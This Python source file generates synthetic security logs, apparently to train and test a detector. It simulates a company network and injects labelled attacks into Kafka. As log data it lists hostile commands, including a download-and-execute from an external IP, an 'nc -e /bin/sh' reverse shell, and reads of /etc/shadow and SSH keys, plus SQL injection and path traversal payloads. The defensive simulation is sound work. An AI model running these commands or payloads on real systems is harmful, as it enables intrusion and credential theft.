"""
Watchtower synthetic security log producer.

Simulates the security-log traffic of a mid-sized company: roughly 180
hosts across workstations, servers, automation and remote staff, plus
occasional attacks from hostile infrastructure.

WHY A POPULATION, NOT A HANDFUL OF IPs
--------------------------------------
With 4 IPs, every source looks busy -- 25 events/sec each -- and "high
volume" is meaningless. With ~180 hosts sharing 100 events/sec, a typical
host emits well under one event/sec, so a source producing 30/sec is
genuinely exceptional. That contrast is the entire signal the detector
works from.

Traffic is deliberately UNEVEN. A few hosts (monitoring agents, backup
jobs, CI runners) generate far more than everyone else, and they are
entirely legitimate. They exist here on purpose: they are the false
positives a detector has to learn not to flag. A system that alerts on
volume alone will flag the backup server every night.

ATTACK RATE
-----------
Attacks are episodic and rare, around 5-10% of traffic. That is not
cosmetic -- a stream that is half attack traffic inflates apparent recall
and hides how much detection actually costs. Raise ATTACK_START_CHANCE for
a demo, but do not judge alert volume or API cost from such a run.

Every event carries `scenario` -- "normal" or the attack name. That is
GROUND TRUTH for evaluation, not a feature. The ETL parse schema does not
read it, so it never reaches the detector.
"""

import io
import itertools
import json
import os
import random
import sys
import time
import uuid
from datetime import datetime, timezone

import fastavro
from kafka import KafkaProducer

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from schemas.registry import (  # noqa: E402
    DEFAULT_SUBJECT,
    SchemaRegistry,
    frame,
    load_local_schema,
)


KAFKA_BROKER = os.getenv("KAFKA_BROKER", "localhost:9092")
KAFKA_TOPIC = os.getenv("KAFKA_TOPIC", "security-logs")
SCHEMA_REGISTRY_URL = os.getenv("SCHEMA_REGISTRY_URL", "http://localhost:8081")
LOGS_PER_SECOND = int(os.getenv("LOGS_PER_SECOND", "1000"))

# The company grows with the rate. At 1,000 logs/sec the network is ~1,780
# hosts, not 178 hosts each logging 10x more: a real company producing 10x
# the logs has more machines, not chattier ones. Keeping per-host behaviour
# constant is what keeps per-host detection thresholds meaningful -- at 10x
# per host, every workstation's ordinary failed logins would look like a
# brute force. Set HOSTS_SCALE=1 for the literal 178 hosts.
HOSTS_SCALE = max(1, int(os.getenv("HOSTS_SCALE", str(max(1, round(LOGS_PER_SECOND / 100))))))

# Hard ceiling on the per-second budget attacks may consume, even with
# several live at once. The remainder is always baseline traffic.
MAX_ATTACK_SHARE = 0.25

# Chance per second that a new attack of a given kind begins, when none of
# that kind is already running.
ATTACK_START_CHANCE = 0.003


# --- the company ----------------------------------------------------------

EMPLOYEES = [
    "a.bennani", "y.tazi", "s.elamrani", "m.chraibi", "k.idrissi",
    "n.berrada", "h.lahlou", "r.ouazzani", "f.saidi", "l.benjelloun",
    "o.fassi", "z.kabbaj", "i.alaoui", "d.sekkat", "t.mansouri",
    "j.doe", "alice", "bob", "john",
]

# Non-human accounts. These legitimately run a lot of commands, which is
# exactly why they are a detector's favourite false positive.
SERVICE_ACCOUNTS = [
    "svc-backup", "svc-monitor", "svc-deploy", "svc-nginx", "svc-postgres",
]

ADMINS = ["admin", "root", "s.elamrani", "k.idrissi"]

BENIGN_COMMANDS = [
    "ls", "whoami", "ps aux", "df -h", "uptime",
    "systemctl status nginx", "tail -f /var/log/app.log",
    "docker ps", "kubectl get pods", "git pull",
    "pg_dump -U postgres app", "rsync -a /data /backup",
]

HOSTILE_COMMANDS = [
    "cat /etc/shadow",
    "cat /etc/passwd",
    "sudo su -",
    "wget http://185.23.44.12/x.sh -O /tmp/x.sh",
    "chmod +x /tmp/x.sh && /tmp/x.sh",
    "useradd -m -G sudo backdoor",
    "cat ~/.ssh/id_rsa",
    "history -c",
    "nc -e /bin/sh 185.23.44.12 4444",
]

SCAN_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
    1433, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017,
]


class Host:
    """One machine on the network, with a role that shapes its behaviour.

    `weight` is its share of baseline traffic. Deliberately skewed: a
    monitoring agent is worth ~60 workstations.
    """

    def __init__(self, ip, role, weight, users, hostname):
        self.ip = ip
        self.role = role
        self.weight = weight
        self.users = users
        self.hostname = hostname


def build_network(scale=1):
    """The company. Host counts multiply by `scale`; every host keeps the
    same role, weight and behaviour, so per-host rates stay constant."""
    hosts = []

    # Employee workstations, one primary user each -- which is why a
    # workstation suddenly touching many accounts is worth noticing.
    for i in range(120 * scale):
        ip = f"192.168.{1 + i // 240}.{10 + i % 240}"
        hosts.append(Host(ip, "workstation", 1.0, [EMPLOYEES[i % len(EMPLOYEES)]], f"ws-{i:04d}"))

    # Application and database servers.
    for i in range(24 * scale):
        ip = f"10.0.{10 + i // 24}.{10 + i % 24}"
        hosts.append(Host(ip, "server", 4.0,
                          random.sample(SERVICE_ACCOUNTS, 2) + ["root"], f"srv-app-{i:03d}"))

    # Automation. Very high volume, entirely legitimate -- the benign heavy
    # hitters that make "high volume == attack" a bad rule.
    roles = [("monitoring", "svc-monitor"), ("backup", "svc-backup"),
             ("ci-runner", "svc-deploy"), ("ci-runner", "svc-deploy")]
    for i in range(4 * scale):
        name, account = roles[i % 4]
        hosts.append(Host(f"10.0.20.{5 + i}", "automation", 60.0, [account], f"{name}-{i:02d}"))

    # Remote staff on public IPs -- legitimately external, so "external
    # therefore suspicious" is also a bad rule.
    for i in range(25 * scale):
        ip = f"102.67.{14 + i // 200}.{40 + i % 200}"
        hosts.append(Host(ip, "remote", 2.0, [EMPLOYEES[i % len(EMPLOYEES)]], f"vpn-{i:03d}"))

    # Partner and branch ranges.
    for i in range(5 * scale):
        ip = f"196.200.{1 + i // 50}.{10 + i % 50}"
        hosts.append(Host(ip, "partner", 1.5, ["partner-api"], f"partner-{i:02d}"))

    return hosts


NETWORK = build_network(HOSTS_SCALE)
# Cumulative weights computed once. random.choices(weights=...) recomputes
# them on every call -- O(hosts) per event, 1.78 million additions a second
# at 1,000 logs/sec over ~1,780 hosts.
NETWORK_CUM_WEIGHTS = list(itertools.accumulate(h.weight for h in NETWORK))

# Attacker infrastructure. Never emits baseline traffic, so an IP-reputation
# or first-seen feature has something real to separate.
HOSTILE_IPS = [
    "185.23.44.12",
    "41.251.72.91",
    "45.134.26.7",
    "193.201.9.88",
]


def _now():
    return datetime.now(timezone.utc).isoformat()


# --- identities ------------------------------------------------------------
# uids matter: 0 is root, and a detector needs to know who a command ran as.
UIDS = {"root": 0, "admin": 1000, "partner-api": 2001}
UIDS.update({name: 1001 + i for i, name in enumerate(EMPLOYEES)})
UIDS.update({name: 990 + i for i, name in enumerate(SERVICE_ACCOUNTS)})

# The company's web application, and the servers people SSH into.
WEB_SERVERS = ["10.0.10.10", "10.0.10.11", "10.0.10.12"]
SSH_TARGETS = [f"10.0.10.{n}" for n in range(10, 34)]   # the first server rack

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
]
PARTNER_AGENT = "partner-sync/2.3 python-requests/2.32"

# Ordinary requests to the company app: (method, path, status, bytes range).
NORMAL_REQUESTS = [
    ("GET", "/", 200, (8_000, 20_000)),
    ("GET", "/dashboard", 200, (15_000, 60_000)),
    ("POST", "/login", 200, (800, 2_000)),
    ("GET", "/api/v1/orders", 200, (2_000, 40_000)),
    ("POST", "/api/v1/orders", 201, (500, 1_500)),
    ("GET", "/api/v1/products?id={n}", 200, (1_000, 6_000)),
    ("GET", "/static/app.3f9c1a.js", 200, (180_000, 320_000)),
    ("GET", "/static/logo.png", 304, (0, 0)),
    ("GET", "/api/v1/reports/export?month=2026-08", 200, (2_000_000, 5_000_000)),
    # benign noise that looks alarming in isolation
    ("GET", "/favicon.ico", 404, (150, 150)),
    ("POST", "/login", 401, (400, 600)),
]
NORMAL_REQUEST_WEIGHTS = [10, 14, 5, 14, 6, 12, 9, 8, 1, 3, 2]

NORMAL_FILES = [
    ("/home/{user}/notes.md", "read"), ("/home/{user}/report.xlsx", "write"),
    ("/srv/app/config.yaml", "read"), ("/var/log/app/app.log", "read"),
    ("/srv/data/exports/orders.csv", "write"),
]

# Legitimate automation, some of it genuinely as root. A rule that treats
# "ran as root" as malicious alerts on the nightly backup.
AUTOMATION_COMMANDS = {
    "svc-backup": [("rsync -a /srv/data /backup/data", "rsync", 0),
                   ("pg_dump -U postgres app > /backup/app.sql", "pg_dump", 0)],
    "svc-monitor": [("df -h", "df", 991), ("systemctl status nginx", "systemctl", 991),
                    ("curl -s http://localhost/healthz", "curl", 991)],
    "svc-deploy": [("docker pull registry.local/app:latest", "docker", 992),
                   ("kubectl rollout status deploy/app", "kubectl", 992),
                   ("git pull", "git", 992)],
}

# --- attack payloads -------------------------------------------------------
SQLI_PATHS = [
    "/api/v1/products?id=42' OR '1'='1",
    "/api/v1/products?id=42 UNION SELECT username,password FROM users--",
    "/api/v1/products?id=42%27%20OR%201%3D1--",
    "/login?user=admin'--",
    "/api/v1/orders?sort=id;DROP TABLE orders--",
]
TRAVERSAL_PATHS = [
    "/static/../../../../etc/passwd",
    "/download?file=../../../etc/shadow",
    "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/api/v1/reports/export?template=....//....//etc/hosts",
]
SCAN_PATHS = [
    "/.env", "/.git/config", "/wp-admin/", "/wp-login.php", "/phpmyadmin/",
    "/admin/", "/server-status", "/backup.zip", "/config.php.bak", "/.aws/credentials",
    "/actuator/env", "/api/swagger.json", "/.DS_Store", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
]
SCANNER_AGENTS = ["sqlmap/1.8.2#stable (https://sqlmap.org)", "gobuster/3.6", "Nikto/2.5.0", "Mozilla/5.0 zgrab/0.x"]


def _severity_for(event_type):
    """Severity that corresponds to the event, rather than being random.

    An earlier version chose this at random, producing nonsense such as
    LOGIN_SUCCESS / severity=ERROR. A model given that field learns noise.
    """
    if event_type in ("LOGIN_FAILURE", "PORT_SCAN", "COMMAND_EXECUTION"):
        return "WARNING"
    return "INFO"


def _event(event_type, source_ip, user, hostname, scenario, **extra):
    log = {
        "event_id": str(uuid.uuid4()),
        "timestamp": _now(),
        "source_ip": source_ip,
        "user": user,
        "event_type": event_type,
        "hostname": hostname,
        "severity": _severity_for(event_type),
        "scenario": scenario,
    }
    log.update(extra)
    return log


def _session():
    return uuid.uuid4().hex[:16]


# --- context builders: one per kind of log ---------------------------------

def ssh_login(src, user, host, scenario, success, auth="publickey", reason=None, dest=None):
    return _event(
        "LOGIN_SUCCESS" if success else "LOGIN_FAILURE", src, user, host, scenario,
        log_source="sshd", outcome="success" if success else "failure",
        session_id=_session(), dest_ip=dest or random.choice(SSH_TARGETS),
        dest_port=22, protocol="ssh", auth_method=auth,
        process_name="sshd", reason=reason,
    )


def ssh_connection(src, user, host, scenario, dest=None):
    return _event(
        "SSH_CONNECTION", src, user, host, scenario,
        log_source="sshd", outcome="allowed", session_id=_session(),
        dest_ip=dest or random.choice(SSH_TARGETS), dest_port=22, protocol="ssh",
        process_name="sshd",
    )


def file_access(src, user, host, scenario, path, operation, uid=None, process="python3"):
    return _event(
        "FILE_ACCESS", src, user, host, scenario,
        log_source="auditd", outcome="success",
        file_path=path, file_operation=operation,
        process_name=process, process_id=random.randint(1000, 60000),
        process_uid=UIDS.get(user, 1500) if uid is None else uid,
    )


def command(src, user, host, scenario, cmd, process, uid, parent="bash"):
    return _event(
        "COMMAND_EXECUTION", src, user, host, scenario,
        log_source="sudo" if cmd.startswith("sudo") else "auditd", outcome="success",
        command=cmd, process_name=process, process_id=random.randint(1000, 60000),
        parent_process=parent, process_uid=uid,
    )


def http(src, user, host, scenario, method, path, status, agent, size, dest=None, rt=None):
    return _event(
        "HTTP_REQUEST", src, user, host, scenario,
        log_source="nginx", outcome="success" if status < 400 else "failure",
        session_id=_session(), dest_ip=dest or random.choice(WEB_SERVERS),
        dest_port=443, protocol="https",
        http_method=method, url_path=path, http_status=status,
        user_agent=agent, bytes_sent=size,
        response_time_ms=rt if rt is not None else random.randint(8, 180),
    )


def port_probe(src, user, host, scenario, port, dest=None):
    return _event(
        "PORT_SCAN", src, user, host, scenario,
        log_source="firewall", outcome="denied",
        dest_ip=dest or random.choice(SSH_TARGETS), dest_port=port, protocol="tcp",
        target_port=port,
    )


# --- baseline -------------------------------------------------------------

# Each role behaves differently. A workstation mostly browses and reads
# files; automation almost only runs commands; partners only call the API.
ROLE_PROFILES = {
    "workstation": (
        ["HTTP_REQUEST", "FILE_ACCESS", "LOGIN_SUCCESS", "COMMAND_EXECUTION", "SSH_CONNECTION", "LOGIN_FAILURE"],
        [40, 20, 14, 12, 8, 6],
    ),
    "server": (
        ["FILE_ACCESS", "COMMAND_EXECUTION", "SSH_CONNECTION", "LOGIN_SUCCESS", "HTTP_REQUEST", "LOGIN_FAILURE"],
        [34, 28, 14, 12, 9, 3],
    ),
    "automation": (
        ["COMMAND_EXECUTION", "FILE_ACCESS", "SSH_CONNECTION", "LOGIN_SUCCESS"],
        [55, 30, 10, 5],
    ),
    "remote": (
        ["HTTP_REQUEST", "LOGIN_SUCCESS", "SSH_CONNECTION", "FILE_ACCESS", "LOGIN_FAILURE", "COMMAND_EXECUTION"],
        [45, 18, 12, 10, 8, 7],
    ),
    "partner": (
        ["HTTP_REQUEST", "LOGIN_SUCCESS", "LOGIN_FAILURE"],
        [85, 10, 5],
    ),
}


def _normal_request(host, user):
    method, path, status, (lo, hi) = random.choices(NORMAL_REQUESTS, weights=NORMAL_REQUEST_WEIGHTS, k=1)[0]
    path = path.format(n=random.randint(1, 900))
    agent = PARTNER_AGENT if host.role == "partner" else random.choice(BROWSERS)
    return http(host.ip, user, host.hostname, "normal", method, path, status, agent, random.randint(lo, hi))


def generate_normal():
    host = random.choices(NETWORK, cum_weights=NETWORK_CUM_WEIGHTS, k=1)[0]
    types, weights = ROLE_PROFILES[host.role]
    event_type = random.choices(types, weights=weights, k=1)[0]
    user = random.choice(host.users)
    src, name = host.ip, host.hostname

    if event_type == "HTTP_REQUEST":
        return _normal_request(host, user)

    if event_type == "LOGIN_SUCCESS":
        auth = "token" if host.role == "partner" else random.choice(["publickey", "publickey", "mfa"])
        return ssh_login(src, user, name, "normal", True, auth=auth)

    if event_type == "LOGIN_FAILURE":
        # ordinary human error
        return ssh_login(src, user, name, "normal", False, auth="password",
                         reason=random.choice(["invalid_password", "authentication_failure", "session_expired"]))

    if event_type == "SSH_CONNECTION":
        return ssh_connection(src, user, name, "normal")

    if event_type == "FILE_ACCESS":
        path, op = random.choice(NORMAL_FILES)
        return file_access(src, user, name, "normal", path.format(user=user), op)

    # COMMAND_EXECUTION
    if host.role == "automation" and user in AUTOMATION_COMMANDS:
        cmd, process, uid = random.choice(AUTOMATION_COMMANDS[user])
        return command(src, user, name, "normal", cmd, process, uid, parent="cron")
    cmd = random.choice(BENIGN_COMMANDS)
    return command(src, user, name, "normal", cmd, cmd.split()[0], UIDS.get(user, 1500))


# --- attacks --------------------------------------------------------------

class Attack:
    """One in-flight attack, emitting `rate` events/sec for `duration`."""

    def __init__(self, kind, duration, rate):
        self.kind = kind
        self.remaining = duration
        self.rate = rate
        self.compromised = False
        self.target = random.choice(SSH_TARGETS)
        self.web_target = random.choice(WEB_SERVERS)

        if kind in ("lateral_movement", "data_exfiltration"):
            # Already inside: a compromised workstation. External-IP
            # heuristics cannot catch either of these.
            host = random.choice([h for h in NETWORK if h.role == "workstation"])
            self.source_ip = host.ip
            self.hostname = host.hostname
            self.user = host.users[0]
        else:
            self.source_ip = random.choice(HOSTILE_IPS)
            self.hostname = random.choice(NETWORK).hostname
            self.user = random.choice(ADMINS)

        self.target_user = random.choice(ADMINS)
        self.agent = random.choice(SCANNER_AGENTS)

    def tick(self):
        self.remaining -= 1
        return [self._emit() for _ in range(self.rate)]

    def _emit(self):
        return getattr(self, "_" + self.kind)()

    def _ssh_brute_force(self):
        # Many failures against ONE account, sometimes ending in success.
        # The success after a wall of failures is the part that matters.
        if not self.compromised and self.remaining <= 2 and random.random() < 0.3:
            self.compromised = True
            return ssh_login(self.source_ip, self.target_user, self.hostname, self.kind,
                             True, auth="password", dest=self.target)
        return ssh_login(self.source_ip, self.target_user, self.hostname, self.kind, False,
                         auth="password", dest=self.target,
                         reason=random.choice(["invalid_password", "authentication_failure"]))

    def _password_spray(self):
        # One password against MANY accounts -- the inverse of brute force.
        return ssh_login(self.source_ip, random.choice(EMPLOYEES + SERVICE_ACCOUNTS),
                         self.hostname, self.kind, False, auth="password",
                         dest=self.target, reason="invalid_password")

    def _port_scan(self):
        return port_probe(self.source_ip, "-", self.hostname, self.kind,
                          random.choice(SCAN_PORTS), dest=self.target)

    def _privilege_escalation(self):
        # Post-compromise on an owned host: an ssh session, a shell, then
        # the classic moves -- mostly as root once `sudo su -` lands.
        cmd = random.choice(HOSTILE_COMMANDS)
        if "shadow" in cmd or "id_rsa" in cmd:
            return file_access(self.source_ip, self.target_user, self.hostname, self.kind,
                               "/etc/shadow" if "shadow" in cmd else "/root/.ssh/id_rsa",
                               "read", uid=0, process="cat")
        return command(self.source_ip, self.target_user, self.hostname, self.kind,
                       cmd, cmd.split()[0], 0, parent="sshd")

    def _lateral_movement(self):
        # An internal host sweeping the server range it never normally touches.
        dest = random.choice(SSH_TARGETS)
        if random.random() < 0.5:
            return port_probe(self.source_ip, self.user, self.hostname, self.kind,
                              random.choice([22, 445, 3389, 5432, 3306]), dest=dest)
        return ssh_connection(self.source_ip, random.choice(ADMINS), self.hostname, self.kind, dest=dest)

    def _sql_injection(self):
        status = random.choice([500, 500, 200, 403])
        return http(self.source_ip, "-", self.hostname, self.kind, "GET",
                    random.choice(SQLI_PATHS), status, self.agent,
                    random.randint(300, 9_000), dest=self.web_target)

    def _path_traversal(self):
        status = random.choice([400, 403, 404, 200])
        return http(self.source_ip, "-", self.hostname, self.kind, "GET",
                    random.choice(TRAVERSAL_PATHS), status, self.agent,
                    random.randint(150, 3_000), dest=self.web_target)

    def _web_scan(self):
        # Directory brute force: a flood of 404s on paths nobody browses to.
        status = 404 if random.random() < 0.92 else 403
        return http(self.source_ip, "-", self.hostname, self.kind, "GET",
                    random.choice(SCAN_PATHS), status, self.agent, 150, dest=self.web_target)

    def _data_exfiltration(self):
        # Quiet on every axis but one: a normal browser, 200s, a real
        # endpoint -- and hundreds of megabytes. Only volume gives it away.
        return http(self.source_ip, self.user, self.hostname, self.kind, "GET",
                    "/api/v1/reports/export?all=true&format=csv", 200,
                    BROWSERS[0], random.randint(40_000_000, 120_000_000),
                    dest=self.web_target, rt=random.randint(2_000, 9_000))


ATTACK_KINDS = [
    # kind,                  duration (s),  rate (events/s)
    ("ssh_brute_force",      (25, 60),      (18, 40)),
    ("port_scan",            (10, 25),      (12, 30)),
    ("password_spray",       (30, 70),      (8, 18)),
    ("privilege_escalation", (8, 20),       (3, 9)),
    ("lateral_movement",     (15, 40),      (6, 16)),
    ("sql_injection",        (15, 40),      (4, 12)),
    ("path_traversal",       (10, 30),      (3, 10)),
    ("web_scan",             (20, 50),      (15, 35)),
    ("data_exfiltration",    (20, 60),      (1, 3)),
]


def maybe_start_attack(active):
    """At most one new attack per second, never two of the same kind."""
    live = {a.kind for a in active}

    for kind, duration_range, rate_range in ATTACK_KINDS:
        if kind in live:
            continue
        if random.random() < ATTACK_START_CHANCE:
            attack = Attack(
                kind, random.randint(*duration_range), random.randint(*rate_range)
            )
            print(
                f"  [attack] {kind} from {attack.source_ip} -> "
                f"{attack.target_user} ({attack.rate}/s for {attack.remaining}s)",
                flush=True,
            )
            return attack

    return None


class AvroSerializer:
    """Confluent-framed Avro, using a schema id fetched from the registry.

    The producer LOOKS UP its schema; it never registers one. If the local
    schema is not already registered, startup fails with instructions rather
    than quietly publishing a new format nobody reviewed.
    """

    def __init__(self, registry_url, subject=DEFAULT_SUBJECT):
        schema_json = load_local_schema()
        self.schema_id = SchemaRegistry(registry_url).lookup_id(subject, schema_json)

        if self.schema_id is None:
            raise SystemExit(
                f"Schema in schemas/security_event.avsc is not registered under "
                f"{subject} at {registry_url}.\n"
                f"Register it first:  python tools/schema_registry.py register"
            )

        schema = json.loads(schema_json)
        self.parsed = fastavro.parse_schema(schema)

        # Every nullable field, derived from the schema itself, so a field
        # added in a later version is null-filled without a code change.
        self.optional = [
            f["name"] for f in schema["fields"]
            if isinstance(f["type"], list) and "null" in f["type"]
        ]

    def __call__(self, event):
        for field in self.optional:
            event.setdefault(field, None)

        buffer = io.BytesIO()
        fastavro.schemaless_writer(buffer, self.parsed, event)
        return frame(self.schema_id, buffer.getvalue())


def main():
    serializer = AvroSerializer(SCHEMA_REGISTRY_URL)

    # Keyed by source_ip: every event from one IP lands on the same
    # partition. The feature stage keeps its state per source_ip, so this
    # is what lets that state stay partition-local as Kafka scales out.
    producer = KafkaProducer(
        bootstrap_servers=KAFKA_BROKER,
        key_serializer=lambda key: key.encode("utf-8"),
        value_serializer=serializer,
        # Batches form over 5 ms at most: throughput without holding events.
        linger_ms=5,
    )

    roles = {}
    for host in NETWORK:
        roles[host.role] = roles.get(host.role, 0) + 1

    print("Starting Watchtower producer (company simulation)")
    print(f"Kafka: {KAFKA_BROKER}")
    print(f"Topic: {KAFKA_TOPIC}")
    print(f"Rate:  {LOGS_PER_SECOND} logs/sec")
    print(f"Hosts: {len(NETWORK)} -- " + ", ".join(f"{n} {r}" for r, n in sorted(roles.items())))
    print(f"Hostile IPs: {len(HOSTILE_IPS)}   attack ceiling: {int(MAX_ATTACK_SHARE*100)}%")
    print(f"Schema: {DEFAULT_SUBJECT} id={serializer.schema_id} (Avro, keyed by source_ip)", flush=True)

    active = []
    attack_budget = int(LOGS_PER_SECOND * MAX_ATTACK_SHARE)

    try:
        while True:
            start = time.perf_counter()

            new = maybe_start_attack(active)
            if new is not None:
                active.append(new)

            batch = []
            for attack in list(active):
                if len(batch) >= attack_budget:
                    break
                batch.extend(attack.tick())
                if attack.remaining <= 0:
                    active.remove(attack)

            # Attacks never crowd out the baseline: total stays at
            # LOGS_PER_SECOND and normal traffic fills the remainder.
            batch = batch[:attack_budget]
            while len(batch) < LOGS_PER_SECOND:
                batch.append(generate_normal())

            # Real sources emit continuously, not as one burst per second:
            # each event is stamped and sent at its own moment, spread
            # evenly over the second. (Stamping 1,000 events and THEN
            # sending them all charged every event the time it took to
            # generate and send the rest -- up to a second of "latency"
            # that was the simulator's, not the pipeline's.)
            random.shuffle(batch)
            for i, log in enumerate(batch):
                delay = start + i / len(batch) - time.perf_counter()
                if delay > 0:
                    time.sleep(delay)
                log["timestamp"] = _now()
                producer.send(KAFKA_TOPIC, key=log["source_ip"], value=log)

            time.sleep(max(0, 1 - (time.perf_counter() - start)))

    except KeyboardInterrupt:
        print("\nStopping producer...")

    finally:
        producer.flush()
        producer.close()


if __name__ == "__main__":
    main()
